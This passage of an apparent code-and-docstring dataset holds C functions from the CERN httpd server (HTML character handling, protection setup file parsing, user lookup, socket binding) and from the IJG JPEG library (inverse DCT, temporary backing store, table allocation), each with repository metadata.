MAX_NESTING); \n\t    return;\n\t}\n    \t--(me->sp);\n\tme->sp[0].style = me->new_style;\t/* Stack new style */\n\tme->sp[0].tag_number = element_number;\n    }\t\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\tCharacter handling\n**\t------------------\n*/\n", "func_signal": "PRIVATE void HTML_put_character ARGS2(HTStructured *, me, char, c)", "code": "{\n\n    switch (me->sp[0].tag_number) {\n    case HTML_COMMENT:\n    \tbreak;\t\t\t\t\t/* Do Nothing */\n\t\n    case HTML_TITLE:\t\n    \tHTChunkPutc(&me->title, c);\n\tbreak;\n\n\t\n    case HTML_LISTING:\t\t\t\t/* Litteral text */\n    case HTML_XMP:\n    case HTML_PLAINTEXT:\n    case HTML_PRE:\n/*\tWe guarrantee that the style is up-to-date in begin_litteral\n*/\n    \tHText_appendCharacter(me->text, c);\n\tbreak;\n\t\n    default:\t\t\t\t\t/* Free format text */\n\tif (me->style_change) {\n\t    if ((c=='\\n') || (c==' ')) return;\t/* Ignore it */\n\t    UPDATE_STYLE;\n\t}\n\tif (c=='\\n') {\n\t    if (me->in_word) {\n\t\tHText_appendCharacter(me->text, ' ');\n\t\tme->in_word = NO;\n\t    }\n\t} else {\n\t    HText_appendCharacter(me->text, c);\n\t    me->in_word = YES;\n\t}\n    } /* end switch */\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* PUBLIC\t\t\t\t\tHTAA_setCurrentProtection()\n**\t\tSET THE CURRENT PROTECTION MODE\n**\t\t(called by rule system when a\n**\t\t\"protect\" rule is matched)\n** ON ENTRY:\n**\treq\t\trequest structure.\n**\tprot_filename\tis the protection setup file (second argument\n**\t\t\tfor \"protect\" rule, optional)\n**\tids\t\tcontains user and group names/ids.\n**\t\t\tDefault are nobody and nogroup. (Third argument\n**\t\t\tfor \"Protect\" rule, optional; can be given\n**\t\t\tonly if protection setup file is also given).\n**\n** ON EXIT:\n**\treturns\t\tnothing.\n**\t\t\tSets current protection mode of the request.\n*/\n", "func_signal": "PUBLIC void HTAA_setCurrentProtection ARGS3(HTRequest *,\treq,\n\t\t\t\t\t    CONST char *,\tprot_filename,\n\t\t\t\t\t    HTUidGid *,\t\tids)", "code": "{\n    if (!req) {\n\tCTRACE(stderr,\n\t       \"INTERNAL.... req == NULL! [HTAA_setCurrentProtection()]\\n\");\n\treturn;\n    }\n\n    HTProt = NULL;\t/* Not free()'d because this is in cache */\n\n    if (prot_filename) {\n\tHTProt = HTAAProt_new(prot_filename, ids);\n\tHTSetCurrentIds(ids);\n    } else {\n\tif (HTDefProt) {\n\t    HTProt = HTDefProt;\n\t    if (HTProt->ids) HTSetCurrentIds(HTProt->ids);\n\t    CTRACE(stderr,\"Default..... protection used for Protect rule\\n\");\n\t} else {\n\t    HTLog_error(\"Protection file not specified for Protect rule and default protection not set\");\n\t}\n    }\n}", "path": "Daemon\\Implementation\\HTAAProt.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* PRIVATE\t\t\t\t\t\tHTAAProt_new()\n**\t\tALLOCATE A NEW HTAAProt STRUCTURE AND\n**\t\tINITIALIZE IT FROM PROTECTION SETUP FILE\n** ON ENTRY:\n**\tprot_filename\tprotection setup file name.\n**\t\t\tIf NULL, not an error.\n**\tids\t\tUid and gid names or numbers,\n**\t\t\tMay be NULL, defaults to nobody.nogroup.\n**\t\t\tShould be NULL, if prot_file is NULL.\n**\n** ON EXIT:\n**\treturns\t\treturns a new and initialized protection\n**\t\t\tsetup structure.\n**\t\t\tIf setup file is already read in (found\n**\t\t\tin cache), only sets user and group ids,\n**\t\t\tand returns that.\n*/\n", "func_signal": "PRIVATE HTAAProt *HTAAProt_new ARGS2(CONST char *,\tprot_filename,\n\t\t\t\t     HTUidGid *,\tids)", "code": "{\n    HTList *cur = prot_cache;\n    HTAAProtCache *cache_item = NULL;\n    HTAAProt *prot;\n    FILE *fp;\n\n    if (!prot_cache)\n\tprot_cache = HTList_new();\n    \n    while (NULL != (cache_item = (HTAAProtCache*)HTList_nextObject(cur))) {\n\tif (!strcmp(cache_item->prot_filename, prot_filename))\n\t    break;\n    }\n    if (cache_item) {\n\tprot = cache_item->prot;\n\tCTRACE(stderr,\n\t       \"CacheHit... Protection file \\\"%s\\\" already loaded\\n\",\n\t       prot_filename);\n    } else {\n\tCTRACE(stderr, \"Loading..... protection file \\\"%s\\\"\\n\",\n\t       prot_filename);\n\n\tprot = (HTAAProt*)calloc(1, sizeof(HTAAProt));\n\tif (!prot) outofmem(__FILE__, \"HTAAProt_new\");\n\n\tprot->valid_schemes = HTList_new();\n\tprot->values\t= HTAssocList_new();\n\n\tif (prot_filename && NULL != (fp = fopen(prot_filename, \"r\"))) {\n\t    HTAA_parseProtFile(prot, fp, NO);\n\t    fclose(fp);\n\t    if (!(cache_item = (HTAAProtCache*)malloc(sizeof(HTAAProtCache))))\n\t\toutofmem(__FILE__, \"HTAAProt_new\");\n\t    cache_item->prot = prot;\n\t    cache_item->prot_filename = NULL;\n\t    StrAllocCopy(cache_item->prot_filename, prot_filename);\n\t    HTList_addObject(prot_cache, (void*)cache_item);\n\t    /*\n\t    ** Make \"Basic\" by default if password file defined\n\t    */\n\t    if (HTList_isEmpty(prot->valid_schemes) &&\n\t\tHTAssocList_lookup(prot->values, \"passw\")) {\n\t\tHTList_addObject(prot->valid_schemes, (void*)HTAA_BASIC);\n\t\tCTRACE(stderr, \"Default..... \\\"Basic\\\" scheme by default\\n\");\n\t    }\n\t}\n\telse CTRACE(stderr, \"ERROR....... Unable to open prot.setup file \\\"%s\\\"\\n\",\n\t\t    (prot_filename ? prot_filename : \"-null-\"));\n    }\n\n    prot->ids = ids;\n\n    return prot;\n}", "path": "Daemon\\Implementation\\HTAAProt.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* bind_connect - bind both ends of a socket */\n", "func_signal": "PRIVATE int bind_connect ARGS4(int,\t\t\ts,\n\t\t\t       struct sockaddr *,\tlocal,\n\t\t\t       struct sockaddr *,\tremote,\n\t\t\t       int,\t\t\tlength)", "code": "{\n    if (bind(s, local, length) < 0) {\n\tHTLog_error2(\"RFC931: bind() failed:\",HTErrnoString());\n#if 0\n\tsyslog(LOG_ERR, \"bind: %m\");\n#endif\n\treturn (-1);\n    } else {\n\treturn (connect(s, remote, length));\n    }\n}", "path": "Daemon\\Implementation\\HTRFC931.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\tHTConverter for HTML to plain text\n**\t----------------------------------\n**\n**\tThis will convert from HTML to presentation or plain text.\n*/\n", "func_signal": "PUBLIC HTStream* HTMLToPlain ARGS5(\n\tHTRequest *,\t\trequest,\n\tvoid *,\t\t\tparam,\n\tHTFormat,\t\tinput_format,\n\tHTFormat,\t\toutput_format,\n\tHTStream *,\t\toutput_stream)", "code": "{\n    return SGML_new(&DTD, HTML_new(\n    \trequest, NULL, input_format, output_format, output_stream));\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* not VMS */\n", "func_signal": "PRIVATE BOOL uid_by_str ARGS2(char *,\tstr,\n\t\t\t      int *,\tuid)", "code": "{\n    struct passwd *pw = NULL;\n\n    if (!str || !uid) return NO;\n\n    if (HTIsNumber(str))\n\tpw = getpwuid(atoi(str));\n    else /* User name (not number) */\n\tpw = getpwnam(str);\n\n    if (pw) {\n\tCTRACE(stderr, \"SysInfo..... %s means user (%s:%s:%d:%d:...)\\n\", str,\n\t       pw->pw_name, pw->pw_passwd, (int) pw->pw_uid, (int) pw->pw_gid);\n\t*uid = pw->pw_uid;\t\n\treturn YES;\n    }\n    else {\n\tHTLog_error2(\"User not found:\", str);\n\treturn NO;\n    }\n}", "path": "Daemon\\Implementation\\HTAAProt.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/* PRIVATE\t\t\t\t\t\tHTAA_parseProtFile()\n**\t\tPARSE A PROTECTION SETUP FILE AND\n**\t\tPUT THE RESULT IN A HTAAProt STRUCTURE\n** ON ENTRY:\n**\tprot\t\tdestination structure.\n**\tfp\t\topen protection file.\n**\tend_on_brace\tif true we are reading an inlined protection\n**\t\t\tsetup directly from the main config file, and\n**\t\t\twe should stop reading when we encounter \"}\".\n** ON EXIT:\n**\treturns\t\tnothing.\n*/\n", "func_signal": "PRIVATE void HTAA_parseProtFile ARGS3(HTAAProt *, prot,\n\t\t\t\t      FILE *,\t  fp,\n\t\t\t\t      BOOL,\t  end_on_brace)", "code": "{\n    if (prot && fp) {\n\tLexItem lex_item;\n\tchar *fieldname = NULL;\n\n\twhile (LEX_EOF != (lex_item = lex(fp))) {\n\n\t    while (lex_item == LEX_REC_SEP)\t/* Ignore empty lines */\n\t\tlex_item = lex(fp);\n\n\t    if (lex_item == LEX_EOF)\t\t/* End of file */\n\t\tbreak;\n\n\t    if (lex_item == LEX_CLOSE_BRACE && end_on_brace)\n\t\tbreak;\t\t/* End of \"inlined\" protection setup */\n\n\t    if (lex_item == LEX_ALPH_STR) {\t/* Valid setup record */\n\t\t\n\t\tStrAllocCopy(fieldname, lex_buffer);\n\t\t\n\t\tif (LEX_FIELD_SEP != (lex_item = lex(fp)))\n\t\t    unlex(lex_item);\t/* If someone wants to use colon */\n\t\t                        /* after field name it's ok, but */\n\t\t                        /* not required. Here we read it.*/\n\n\t\tif (0==strncasecomp(fieldname, \"Auth\", 4)) {\n\t\t    lex_item = lex(fp);\n\t\t    while (lex_item == LEX_ALPH_STR) {\n\t\t\tHTAAScheme scheme = HTAAScheme_enum(lex_buffer);\n\t\t\tif (scheme != HTAA_UNKNOWN) {\n\t\t\t    if (!prot->valid_schemes)\n\t\t\t\tprot->valid_schemes = HTList_new();\n\t\t\t    HTList_addObject(prot->valid_schemes,(void*)scheme);\n\t\t\t    CTRACE(stderr, \"OkScheme.... %s\\n\",\n\t\t\t\t   HTAAScheme_name(scheme));\n\t\t\t}\n\t\t\telse CTRACE(stderr, \"Unknown..... auth.scheme \\\"%s\\\"\\n\",\n\t\t\t\t    lex_buffer);\n\t\t\t\n\t\t\tif (LEX_ITEM_SEP != (lex_item = lex(fp)))\n\t\t\t    break;\n\t\t\t/*\n\t\t\t** Here lex_item == LEX_ITEM_SEP; after item separator\n\t\t\t** it is ok to have one or more newlines (LEX_REC_SEP)\n\t\t\t** and they are ignored (continuation line).\n\t\t\t*/\n\t\t\tdo {\n\t\t\t    lex_item = lex(fp);\n\t\t\t} while (lex_item == LEX_REC_SEP);\n\t\t    } /* while items in list */\n\t\t} /* if \"Authenticate\" */\n\n\t\telse if (0==strncasecomp(fieldname, \"acloverride\", 7) ||\n\t\t\t 0==strncasecomp(fieldname, \"acl-override\", 8)) {\n\n\t\t    if (LEX_ALPH_STR == (lex_item = lex(fp))) {\n\t\t\tif (!strcasecomp(lex_buffer,\"on\") ||\n\t\t\t    !strcasecomp(lex_buffer,\"yes\") ||\n\t\t\t    !strncasecomp(lex_buffer,\"enabled\",6))\n\t\t\t    prot->acl_override = YES;\n\t\t\telse\n\t\t\t    prot->acl_override = NO;\n\t\t        lex_item = lex(fp);  /* Read record separator */\n\t\t\tCTRACE(stderr,\"ACL-OverRide %s\\n\",\n\t\t\t       prot->acl_override ? \"On\" : \"Off\");\n\t\t    }\n\t\t} /* ACL-OverRide */\n\n\t\telse if (0==strncasecomp(fieldname, \"maskgroup\", 9) ||\n\t\t\t 0==strncasecomp(fieldname, \"mask-group\", 10) ||\n\t\t\t 0==strncasecomp(fieldname, \"get\", 3)) {\n\t\t    prot->get_mask = HTAA_parseGroupDef(fp);\n\t\t    lex_item=LEX_REC_SEP; /*groupdef parser read this already*/\n\t\t    if (TRACE) {\n\t\t\tif (prot->get_mask) {\n\t\t\t    fprintf(stderr, \"GET-Mask....\\n\");\n\t\t\t    HTAA_printGroupDef(prot->get_mask);\n\t\t\t}\n\t\t\telse fprintf(stderr,\"SYNTAX ERROR parsing GET-Mask\\n\");\n\t\t    }\n\t\t} /* if \"Get-Mask\" */\n\n\t\telse if (0==strncasecomp(fieldname, \"put\", 3)) {\n\t\t    prot->put_mask = HTAA_parseGroupDef(fp);\n\t\t    lex_item=LEX_REC_SEP; /*groupdef parser read this already*/\n\t\t    if (TRACE) {\n\t\t\tif (prot->put_mask) {\n\t\t\t    fprintf(stderr, \"PUT-Mask....\\n\");\n\t\t\t    HTAA_printGroupDef(prot->put_mask);\n\t\t\t}\n\t\t\telse fprintf(stderr,\"SYNTAX ERROR parsing PUT-Mask\\n\");\n\t\t    }\n\t\t} /* if \"Put-Mask\" */\n\n\t\telse if (0==strncasecomp(fieldname, \"post\", 4)) {\n\t\t    prot->post_mask = HTAA_parseGroupDef(fp);\n\t\t    lex_item=LEX_REC_SEP; /*groupdef parser read this already*/\n\t\t    if (TRACE) {\n\t\t\tif (prot->post_mask) {\n\t\t\t    fprintf(stderr, \"POST-Mask...\\n\");\n\t\t\t    HTAA_printGroupDef(prot->post_mask);\n\t\t\t}\n\t\t\telse fprintf(stderr,\"SYNTAX ERROR parsing POST-Mask\\n\");\n\t\t    }\n\t\t} /* if \"Post-Mask\" */\n\n\t\telse if (0==strncasecomp(fieldname, \"delete\", 6)) {\n\t\t    prot->delete_mask = HTAA_parseGroupDef(fp);\n\t\t    lex_item=LEX_REC_SEP; /*groupdef parser read this already*/\n\t\t    if (TRACE) {\n\t\t\tif (prot->delete_mask) {\n\t\t\t    fprintf(stderr, \"DELETE-Mask.\\n\");\n\t\t\t    HTAA_printGroupDef(prot->delete_mask);\n\t\t\t}\n\t\t\telse fprintf(stderr, \"SYNTAX ERROR parsing DELETE-Mask\\n\");\n\t\t    }\n\t\t} /* if \"Delete-Mask\" */\n\n\t\telse if (0==strncasecomp(fieldname, \"mask\", 4)) {\n\t\t    prot->gen_mask = HTAA_parseGroupDef(fp);\n\t\t    lex_item=LEX_REC_SEP; /*groupdef parser read this already*/\n\t\t    if (TRACE) {\n\t\t\tif (prot->gen_mask) {\n\t\t\t    fprintf(stderr,\n\t\t\t\t\"General mask (used if no other mask set)\\n\");\n\t\t\t    HTAA_printGroupDef(prot->gen_mask);\n\t\t\t}\n\t\t\telse fprintf(stderr, \"SYNTAX ERROR parsing Mask\\n\");\n\t\t    }\n\t\t}\n\n\t\telse {\t/* Just a name-value pair, put it to assoclist */\n\n\t\t    if (LEX_ALPH_STR == (lex_item = lex(fp))) {\n\t\t\tif (!prot->values)\n\t\t\t    prot->values = HTAssocList_new();\n\t\t\tHTAssocList_add(prot->values, fieldname, lex_buffer);\n\t\t        lex_item = lex(fp);  /* Read record separator */\n\t\t\tCTRACE(stderr, \"Binding..... \\\"%s\\\" bound to \\\"%s\\\"\\n\",\n\t\t\t       fieldname, lex_buffer);\n\t\t    }\n\t\t} /* else name-value pair */\n\n\t\tFREE(fieldname);\t/* Leak fixed AL 6 Feb 1994 */\n\n\t    } /* if valid field */\n\n\t    if (lex_item != LEX_EOF  &&  lex_item != LEX_REC_SEP) {\n\t\tCTRACE(stderr,\n\t\t       \"SYNTAX ERROR in prot.setup file at line %d (that line ignored)\\n\",\n\t\t       lex_line);\n\t\tdo {\n\t\t    lex_item = lex(fp);\n\t\t} while (lex_item != LEX_EOF && lex_item != LEX_REC_SEP);\n\t    } /* if syntax error */\n\t} /* while not end-of-file */\n    } /* if valid parameters */\n}", "path": "Daemon\\Implementation\\HTAAProt.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\tRecord error message as a hypertext object\n**\t------------------------------------------\n**\n**\tThe error message should be marked as an error so that\n**\tit can be reloaded later.\n**\tThis implementation just throws up an error message\n**\tand leaves the document unloaded.\n**\tA smarter implementation would load an error document,\n**\tmarking at such so that it is retried on reload.\n**\n** On entry,\n**\tsink \tis a stream to the output device if any\n**\tnumber\tis the HTTP error number\n**\tmessage\tis the human readable message.\n**\n** On exit,\n**\treturns\ta negative number to indicate lack of success in the load.\n*/\n", "func_signal": "PUBLIC int HTLoadError ARGS3(\n\tHTRequest *, \treq,\n\tint,\t\tnumber,\n\tCONST char *,\tmessage)", "code": "{\n    char *err = \"Oh I screwed up!\";    \t/* Dummy pointer not used (I hope) */\n    HTAlert(message);\t\t/* @@@@@@@@@@@@@@@@@@@ */\n    /* Clean up! Henrik 04/03-94 */\n    if (req && req->output_stream)\n\t(*req->output_stream->isa->abort)(req->output_stream, err);\n#if OLD_CODE\n    HTClearErrors(req);\n#endif\n    return -number;\n}", "path": "Library\\Implementation\\HTML.c", "repo_name": "hackervera/cern-httpd", "stars": 85, "license": "None", "language": "c", "size": 808}
{"docstring": "/*\n * Initialize for an output processing pass.\n */\n", "func_signal": "METHODDEF(void)\nstart_output_pass (j_decompress_ptr cinfo)", "code": "{\n#ifdef BLOCK_SMOOTHING_SUPPORTED\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n\n  /* If multipass, check to see whether to use block smoothing on this pass */\n  if (coef->pub.coef_arrays != NULL) {\n    if (cinfo->do_block_smoothing && smoothing_ok(cinfo))\n      coef->pub.decompress_data = decompress_smooth_data;\n    else\n      coef->pub.decompress_data = decompress_data;\n  }\n#endif\n  cinfo->output_iMCU_row = 0;\n}", "path": "jpeglib\\jdcoefct.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Abort processing of a JPEG compression or decompression operation,\n * but don't destroy the object itself.\n *\n * For this, we merely clean up all the nonpermanent memory pools.\n * Note that temp files (virtual arrays) are not allowed to belong to\n * the permanent pool, so we will be able to close all temp files here.\n * Closing a data source or destination, if necessary, is the application's\n * responsibility.\n */\n", "func_signal": "GLOBAL(void)\njpeg_abort (j_common_ptr cinfo)", "code": "{\n  int pool;\n\n  /* Do nothing if called on a not-initialized or destroyed JPEG object. */\n  if (cinfo->mem == NULL)\n    return;\n\n  /* Releasing pools in reverse order might help avoid fragmentation\n   * with some (brain-damaged) malloc libraries.\n   */\n  for (pool = JPOOL_NUMPOOLS-1; pool > JPOOL_PERMANENT; pool--) {\n    (*cinfo->mem->free_pool) (cinfo, pool);\n  }\n\n  /* Reset overall state for possible reuse of object */\n  if (cinfo->is_decompressor) {\n    cinfo->global_state = DSTATE_START;\n    /* Try to keep application from accessing now-deleted marker list.\n     * A bit kludgy to do it here, but this is the most central place.\n     */\n    ((j_decompress_ptr) cinfo)->marker_list = NULL;\n  } else {\n    cinfo->global_state = CSTATE_START;\n  }\n}", "path": "jpeglib\\jcomapi.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Initial opening of a backing-store object.\n *\n * This version uses FindFolder to find the Temporary Items folder,\n * and puts the temporary file in there.\n */\n", "func_signal": "GLOBAL(void)\njpeg_open_backing_store (j_common_ptr cinfo, backing_store_ptr info,\n\t\t\t long total_bytes_needed)", "code": "{\n  short         tmpRef, vRefNum;\n  long          dirID;\n  FInfo         finderInfo;\n  FSSpec        theSpec;\n  Str255        fName;\n  OSErr         osErr;\n  long          gestaltResponse = 0;\n\n  /* Check that FSSpec calls are available. */\n  osErr = Gestalt( gestaltFSAttr, &gestaltResponse );\n  if ( ( osErr != noErr )\n       || !( gestaltResponse & (1<<gestaltHasFSSpecCalls) ) )\n    ERREXITS(cinfo, JERR_TFILE_CREATE, \"- System 7.0 or later required\");\n  /* TO DO: add a proper error message to jerror.h. */\n\n  /* Check that FindFolder is available. */\n  osErr = Gestalt( gestaltFindFolderAttr, &gestaltResponse );\n  if ( ( osErr != noErr )\n       || !( gestaltResponse & (1<<gestaltFindFolderPresent) ) )\n    ERREXITS(cinfo, JERR_TFILE_CREATE, \"- System 7.0 or later required.\");\n  /* TO DO: add a proper error message to jerror.h. */\n\n  osErr = FindFolder ( kOnSystemDisk, kTemporaryFolderType, kCreateFolder,\n                       &vRefNum, &dirID );\n  if ( osErr != noErr )\n    ERREXITS(cinfo, JERR_TFILE_CREATE, \"- temporary items folder unavailable\");\n  /* TO DO: Try putting the temp files somewhere else. */\n\n  /* Keep generating file names till we find one that's not in use */\n  for (;;) {\n    next_file_num++;\t\t/* advance counter */\n\n    sprintf(info->temp_name, TEMP_FILE_NAME, next_file_num);\n    strcpy ( (Ptr)fName+1, info->temp_name );\n    *fName = strlen (info->temp_name);\n    osErr = FSMakeFSSpec ( vRefNum, dirID, fName, &theSpec );\n\n    if ( (osErr = FSpGetFInfo ( &theSpec, &finderInfo ) ) != noErr )\n      break;\n  }\n\n  osErr = FSpCreate ( &theSpec, '????', '????', smSystemScript );\n  if ( osErr != noErr )\n    ERREXITS(cinfo, JERR_TFILE_CREATE, info->temp_name);\n\n  osErr = FSpOpenDF ( &theSpec, fsRdWrPerm, &(info->temp_file) );\n  if ( osErr != noErr )\n    ERREXITS(cinfo, JERR_TFILE_CREATE, info->temp_name);\n\n  info->tempSpec = theSpec;\n\n  info->read_backing_store = read_backing_store;\n  info->write_backing_store = write_backing_store;\n  info->close_backing_store = close_backing_store;\n  TRACEMSS(cinfo, 1, JTRC_TFILE_OPEN, info->temp_name);\n}", "path": "jpeglib\\jmemmac.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a reduced-size 4x4 output block.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_4x4 (j_decompress_ptr cinfo, jpeg_component_info * compptr,\n\t       JCOEFPTR coef_block,\n\t       JSAMPARRAY output_buf, JDIMENSION output_col)", "code": "{\n  INT32 tmp0, tmp2, tmp10, tmp12;\n  INT32 z1, z2, z3, z4;\n  JCOEFPTR inptr;\n  ISLOW_MULT_TYPE * quantptr;\n  int * wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  int workspace[DCTSIZE*4];\t/* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (ISLOW_MULT_TYPE *) compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = DCTSIZE; ctr > 0; inptr++, quantptr++, wsptr++, ctr--) {\n    /* Don't bother to process column 4, because second pass won't use it */\n    if (ctr == DCTSIZE-4)\n      continue;\n    if (inptr[DCTSIZE*1] == 0 && inptr[DCTSIZE*2] == 0 &&\n\tinptr[DCTSIZE*3] == 0 && inptr[DCTSIZE*5] == 0 &&\n\tinptr[DCTSIZE*6] == 0 && inptr[DCTSIZE*7] == 0) {\n      /* AC terms all zero; we need not examine term 4 for 4x4 output */\n      int dcval = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]) << PASS1_BITS;\n      \n      wsptr[DCTSIZE*0] = dcval;\n      wsptr[DCTSIZE*1] = dcval;\n      wsptr[DCTSIZE*2] = dcval;\n      wsptr[DCTSIZE*3] = dcval;\n      \n      continue;\n    }\n    \n    /* Even part */\n    \n    tmp0 = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n    tmp0 <<= (CONST_BITS+1);\n    \n    z2 = DEQUANTIZE(inptr[DCTSIZE*2], quantptr[DCTSIZE*2]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE*6], quantptr[DCTSIZE*6]);\n\n    tmp2 = MULTIPLY(z2, FIX_1_847759065) + MULTIPLY(z3, - FIX_0_765366865);\n    \n    tmp10 = tmp0 + tmp2;\n    tmp12 = tmp0 - tmp2;\n    \n    /* Odd part */\n    \n    z1 = DEQUANTIZE(inptr[DCTSIZE*7], quantptr[DCTSIZE*7]);\n    z2 = DEQUANTIZE(inptr[DCTSIZE*5], quantptr[DCTSIZE*5]);\n    z3 = DEQUANTIZE(inptr[DCTSIZE*3], quantptr[DCTSIZE*3]);\n    z4 = DEQUANTIZE(inptr[DCTSIZE*1], quantptr[DCTSIZE*1]);\n    \n    tmp0 = MULTIPLY(z1, - FIX_0_211164243) /* sqrt(2) * (c3-c1) */\n\t + MULTIPLY(z2, FIX_1_451774981) /* sqrt(2) * (c3+c7) */\n\t + MULTIPLY(z3, - FIX_2_172734803) /* sqrt(2) * (-c1-c5) */\n\t + MULTIPLY(z4, FIX_1_061594337); /* sqrt(2) * (c5+c7) */\n    \n    tmp2 = MULTIPLY(z1, - FIX_0_509795579) /* sqrt(2) * (c7-c5) */\n\t + MULTIPLY(z2, - FIX_0_601344887) /* sqrt(2) * (c5-c1) */\n\t + MULTIPLY(z3, FIX_0_899976223) /* sqrt(2) * (c3-c7) */\n\t + MULTIPLY(z4, FIX_2_562915447); /* sqrt(2) * (c1+c3) */\n\n    /* Final output stage */\n    \n    wsptr[DCTSIZE*0] = (int) DESCALE(tmp10 + tmp2, CONST_BITS-PASS1_BITS+1);\n    wsptr[DCTSIZE*3] = (int) DESCALE(tmp10 - tmp2, CONST_BITS-PASS1_BITS+1);\n    wsptr[DCTSIZE*1] = (int) DESCALE(tmp12 + tmp0, CONST_BITS-PASS1_BITS+1);\n    wsptr[DCTSIZE*2] = (int) DESCALE(tmp12 - tmp0, CONST_BITS-PASS1_BITS+1);\n  }\n  \n  /* Pass 2: process 4 rows from work array, store into output array. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < 4; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n    /* It's not clear whether a zero row test is worthwhile here ... */\n\n#ifndef NO_ZERO_ROW_TEST\n    if (wsptr[1] == 0 && wsptr[2] == 0 && wsptr[3] == 0 &&\n\twsptr[5] == 0 && wsptr[6] == 0 && wsptr[7] == 0) {\n      /* AC terms all zero */\n      JSAMPLE dcval = range_limit[(int) DESCALE((INT32) wsptr[0], PASS1_BITS+3)\n\t\t\t\t  & RANGE_MASK];\n      \n      outptr[0] = dcval;\n      outptr[1] = dcval;\n      outptr[2] = dcval;\n      outptr[3] = dcval;\n      \n      wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n      continue;\n    }\n#endif\n    \n    /* Even part */\n    \n    tmp0 = ((INT32) wsptr[0]) << (CONST_BITS+1);\n    \n    tmp2 = MULTIPLY((INT32) wsptr[2], FIX_1_847759065)\n\t + MULTIPLY((INT32) wsptr[6], - FIX_0_765366865);\n    \n    tmp10 = tmp0 + tmp2;\n    tmp12 = tmp0 - tmp2;\n    \n    /* Odd part */\n    \n    z1 = (INT32) wsptr[7];\n    z2 = (INT32) wsptr[5];\n    z3 = (INT32) wsptr[3];\n    z4 = (INT32) wsptr[1];\n    \n    tmp0 = MULTIPLY(z1, - FIX_0_211164243) /* sqrt(2) * (c3-c1) */\n\t + MULTIPLY(z2, FIX_1_451774981) /* sqrt(2) * (c3+c7) */\n\t + MULTIPLY(z3, - FIX_2_172734803) /* sqrt(2) * (-c1-c5) */\n\t + MULTIPLY(z4, FIX_1_061594337); /* sqrt(2) * (c5+c7) */\n    \n    tmp2 = MULTIPLY(z1, - FIX_0_509795579) /* sqrt(2) * (c7-c5) */\n\t + MULTIPLY(z2, - FIX_0_601344887) /* sqrt(2) * (c5-c1) */\n\t + MULTIPLY(z3, FIX_0_899976223) /* sqrt(2) * (c3-c7) */\n\t + MULTIPLY(z4, FIX_2_562915447); /* sqrt(2) * (c1+c3) */\n\n    /* Final output stage */\n    \n    outptr[0] = range_limit[(int) DESCALE(tmp10 + tmp2,\n\t\t\t\t\t  CONST_BITS+PASS1_BITS+3+1)\n\t\t\t    & RANGE_MASK];\n    outptr[3] = range_limit[(int) DESCALE(tmp10 - tmp2,\n\t\t\t\t\t  CONST_BITS+PASS1_BITS+3+1)\n\t\t\t    & RANGE_MASK];\n    outptr[1] = range_limit[(int) DESCALE(tmp12 + tmp0,\n\t\t\t\t\t  CONST_BITS+PASS1_BITS+3+1)\n\t\t\t    & RANGE_MASK];\n    outptr[2] = range_limit[(int) DESCALE(tmp12 - tmp0,\n\t\t\t\t\t  CONST_BITS+PASS1_BITS+3+1)\n\t\t\t    & RANGE_MASK];\n    \n    wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n}", "path": "jpeglib\\jidctred.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Convenience routines for allocating quantization and Huffman tables.\n * (Would jutils.c be a more reasonable place to put these?)\n */\n", "func_signal": "GLOBAL(JQUANT_TBL *)\njpeg_alloc_quant_table (j_common_ptr cinfo)", "code": "{\n  JQUANT_TBL *tbl;\n\n  tbl = (JQUANT_TBL *)\n    (*cinfo->mem->alloc_small) (cinfo, JPOOL_PERMANENT, SIZEOF(JQUANT_TBL));\n  tbl->sent_table = FALSE;\t/* make sure this is false in any new table */\n  return tbl;\n}", "path": "jpeglib\\jcomapi.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
